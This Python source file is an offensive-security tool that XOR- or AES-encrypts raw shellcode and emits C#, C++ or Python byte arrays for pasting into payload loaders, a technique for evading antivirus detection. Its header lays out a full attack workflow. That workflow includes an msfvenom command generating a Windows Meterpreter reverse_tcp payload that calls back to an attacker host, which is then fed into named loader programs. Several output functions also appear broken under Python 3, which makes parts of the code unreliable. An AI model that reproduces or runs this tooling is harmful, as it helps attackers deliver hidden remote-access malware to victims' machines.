#!/usr/bin/env python3
# ================================================================
# xor_encoder.py — XOR and AES Shellcode Encoder (copy of shellcode_encoder.py)
# ================================================================
# WHAT THIS DOES:
#   Reads a raw binary shellcode file and encodes/encrypts it using
#   either XOR or AES-128-CBC. Generates output files in ./result/
#   formatted as C#, C++, or Python byte arrays ready to paste into
#   your loader's buf[] variable.
#
#   This is a copy of shellcode_encoder.py placed in the xor/ directory
#   for convenience. Both files have identical functionality.
#
#   For XOR: XORs each byte against corresponding bytes of the key
#   string (repeating if key is shorter than shellcode).
#   For AES: derives a 16-byte key from your password string using
#   pyscrypt (scrypt KDF with salt "saltmegood"). IV is random and
#   prepended to the ciphertext.
#
# INSTALL DEPENDENCIES (first time only, on Kali):
#   pip3 install pycryptodome pyscrypt
#   (If pip3 fails: pip install pycryptodome pyscrypt)
#
# USAGE:
#   python3 xor_encoder.py <shellcode_file> <key> <xor|aes> [output_flags]
#
#   Arguments:
#     shellcode_file    Path to your raw shellcode binary (e.g. shell.bin)
#     key               Password/key string for encoding
#     xor|aes           Encoding type: 'xor' or 'aes'
#
#   Output flags (choose one or more):
#     -cs               Generate C# byte array file (most common)
#     -cpp              Generate C++ byte array file
#     -py               Generate Python byte array file
#     -b64              Print base64-encoded output to stdout
#
# EXAMPLES:
#   XOR encode for C#:
#     python3 xor_encoder.py shell.bin mykey xor -cs
#
#   AES encrypt for C#:
#     python3 xor_encoder.py shell.bin mypassword aes -cs
#
#   XOR encode for all formats:
#     python3 xor_encoder.py shell.bin mykey xor -cs -cpp -py
#
#   XOR encode, print base64:
#     python3 xor_encoder.py shell.bin mykey xor -b64
#
# OUTPUT:
#   Files created in ./result/ directory:
#     ./result/encryptedShellcodeWrapper_xor.cs
#     ./result/encryptedShellcodeWrapper_aes.cs
#   Open the file, copy the byte array, paste into your loader's buf[].
#
# FULL WORKFLOW (for sections-runner.cs, DLL_Runner.cs, simpleLoader.c):
#   1. Generate shellcode on Kali:
#        msfvenom -p windows/x64/meterpreter/reverse_tcp \
#          LHOST=<YOUR_IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin
#
#   2. XOR encode:
#        cd /path/to/04-encoders/xor/
#        python3 xor_encoder.py shell.bin mykey xor -cs
#
#   3. Open result/encryptedShellcodeWrapper_xor.cs
#      Copy the byte array
#
#   4. Paste into your loader's buf[] variable
#
# NOTES:
#   - Run this script from the 04-encoders/xor/ directory so it can
#     find the ./templates/ folder for output formatting
#   - Run with: cd /path/to/04-encoders/xor/ && python3 xor_encoder.py ...
#   - For AES encoding, the key shown in script output is the DERIVED key
#     (not your password) — use that derived key in MyKey/Myiv in your loader
# ================================================================
#!/usr/bin/python
# -*- coding: utf8 -*-
#
#

import argparse
from Crypto.Hash import MD5
from Crypto.Cipher import AES
import pyscrypt
from base64 import b64encode
from os import urandom
from string import Template
import os

templates = {
	'cpp': './templates/encryptedShellcodeWrapper.cpp',
	'csharp': './templates/encryptedShellcodeWrapper.cs',
	'python': './templates/encryptedShellcodeWrapper.py'
}

resultFiles = {
	'cpp': './result/encryptedShellcodeWrapper.cpp',
	'csharp': './result/encryptedShellcodeWrapper.cs',
	'python': './result/encryptedShellcodeWrapper.py'
}

#======================================================================================================
#											CRYPTO FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
# data as a bytearray
# key as a string
def xor(data, key):
	l = len(key)
	keyAsInt = list(map(ord, key))
	return bytes(bytearray((
	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
	)))

#------------------------------------------------------------------------
def pad(s):
	"""PKCS7 padding"""
	return s + ((AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)).encode()

#------------------------------------------------------------------------
def aesEncrypt(clearText, key):
	"""Encrypts data with the provided key.
	The returned byte array is as follow:
	:==============:==================================================:
	: IV (16bytes) :    Encrypted (data + PKCS7 padding information)  :
	:==============:==================================================:
	"""

	# Generate a crypto secure random Initialization Vector
	iv = urandom(AES.block_size)

	# Perform PKCS7 padding so that clearText is a multiple of the block size
	clearText = pad(clearText)

	cipher = AES.new(key, AES.MODE_CBC, iv)
	return iv + cipher.encrypt(bytes(clearText))

#======================================================================================================
#											OUTPUT FORMAT FUNCTIONS
#======================================================================================================
def convertFromTemplate(parameters, templateFile):
	try:
		with open(templateFile) as f:
			src = Template(f.read())
			result = src.substitute(parameters)
			f.close()
			return result
	except IOError:
		print(color("[!] Could not open or read template file [{}]".format(templateFile)))
		return None

#------------------------------------------------------------------------
# data as a bytearray
def formatCPP(data, key, cipherType):
	shellcode = "\\x"
	shellcode += "\\x".join(format(ord(b),'02x') for b in data)
	result = convertFromTemplate({'shellcode': shellcode, 'key': key, 'cipherType': cipherType}, templates['cpp'])

	if result != None:
		try:
			fileName = os.path.splitext(resultFiles['cpp'])[0] + "_" + cipherType + os.path.splitext(resultFiles['cpp'])[1]
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print(color("[+] C++ code file saved in [{}]".format(fileName)))
		except IOError:
			print(color("[!] Could not write C++ code  [{}]".format(fileName)))

#------------------------------------------------------------------------
# data as a bytearray
def formatCSharp(data, key, cipherType):
	shellcode = '0x'
	shellcode += ',0x'.join(format(int(b),'02x') for b in data)
	result = convertFromTemplate({'shellcode': shellcode, 'key': key.decode(), 'cipherType': cipherType}, templates['csharp'])

	if result != None:
		try:
			fileName = os.path.splitext(resultFiles['csharp'])[0] + "_" + cipherType + os.path.splitext(resultFiles['csharp'])[1]
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print(color("[+] C# code file saved in [{}]".format(fileName)))
		except IOError:
			print(color("[!] Could not write C# code  [{}]".format(fileName)))

#------------------------------------------------------------------------
# data as a bytearray
def formatPy(data, key, cipherType):
	shellcode = '\\x'
	shellcode += '\\x'.join(format(ord(b),'02x') for b in data)
	result = convertFromTemplate({'shellcode': shellcode, 'key': key, 'cipherType': cipherType}, templates['python'])

	if result != None:
		try:
			fileName = os.path.splitext(resultFiles['python'])[0] + "_" + cipherType + os.path.splitext(resultFiles['python'])[1]
			with open(fileName,"w+") as f:
				f.write(result)
				f.close()
				print(color("[+] Python code file saved in [{}]".format(fileName)))
		except IOError:
			print(color("[!] Could not write Python code  [{}]".format(fileName)))

#------------------------------------------------------------------------
# data as a bytearray
def formatB64(data):
	return b64encode(data)

#======================================================================================================
#											HELPERS FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
def color(string, color=None):
    """
    Author: HarmJ0y, borrowed from Empire
    Change text color for the Linux terminal.
    """
    
    attr = []
    # bold
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

#======================================================================================================
#											MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':
	#------------------------------------------------------------------------
	# Parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("shellcodeFile", help="File name containing the raw shellcode to be encoded/encrypted")
	parser.add_argument("key", help="Key used to transform (XOR or AES encryption) the shellcode")
	parser.add_argument("encryptionType", help="Encryption algorithm to apply to the shellcode", choices=['xor','aes'])
	parser.add_argument("-b64", "--base64", help="Display transformed shellcode as base64 encoded string", action="store_true")
	parser.add_argument("-cpp", "--cplusplus", help="Generates C++ file code", action="store_true")
	parser.add_argument("-cs", "--csharp", help="Generates C# file code", action="store_true")
	parser.add_argument("-py", "--python", help="Generates Python file code", action="store_true")
	args = parser.parse_args() 

	#------------------------------------------------------------------------------
	# Check that required directories and path are available, if not create them
	if not os.path.isdir("./result"):
		os.makedirs("./result")
		print(color("[+] Creating [./result] directory for resulting code files"))

	#------------------------------------------------------------------------
	# Open shellcode file and read all bytes from it
	try:
		with open(args.shellcodeFile, 'rb') as shellcodeFileHandle:
			shellcodeBytes = bytearray(shellcodeFileHandle.read())
			shellcodeFileHandle.close()
			print(color("[*] Shellcode file [{}] successfully loaded".format(args.shellcodeFile)))
	except IOError:
		print(color("[!] Could not open or read file [{}]".format(args.shellcodeFile)))
		quit()

	print(color("[*] MD5 hash of the initial shellcode: [{}]".format(MD5.new(shellcodeBytes).hexdigest())))
	print(color("[*] Shellcode size: [{}] bytes".format(len(shellcodeBytes))))

	#------------------------------------------------------------------------
	# Perform AES128 transformation
	if args.encryptionType == 'aes':
		# Derive a 16 bytes (128 bits) master key from the provided key
		key = pyscrypt.hash(args.key.encode(), "saltmegood".encode(), 1024, 1, 1, 16)
		masterKey = formatB64(key)
		print(color("[*] AES encrypting the shellcode with 128 bits derived key [{}]".format(masterKey)))
		transformedShellcode = aesEncrypt(shellcodeBytes, key)
		cipherType = 'aes'

	#------------------------------------------------------------------------
	# Perform XOR transformation
	elif args.encryptionType == 'xor':
		masterKey = args.key
		print(color("[*] XOR encoding the shellcode with key [{}]".format(masterKey)))
		transformedShellcode = xor(shellcodeBytes, masterKey)
		cipherType = 'xor'

	#------------------------------------------------------------------------
	# Display interim results
	print("\n==================================== RESULT ====================================\n")
	print(color("[*] Encrypted shellcode size: [{}] bytes".format(len(transformedShellcode))))
	#------------------------------------------------------------------------
	# Display formated output
	if args.base64:
		print(color("[*] Transformed shellcode as a base64 encoded string"))		
		print(formatB64(transformedShellcode))
		print("")
	
	if args.cplusplus:
		print(color("[*] Generating C++ code file"))
		formatCPP(transformedShellcode, masterKey, cipherType)
		print("")
		

	if args.csharp:
		print(color("[*] Generating C# code file"))
		formatCSharp(transformedShellcode, masterKey, cipherType)
		print("")

	if args.python:
		print(color("[*] Generating Python code file"))
		formatPy(transformedShellcode, masterKey, cipherType)
		print("")
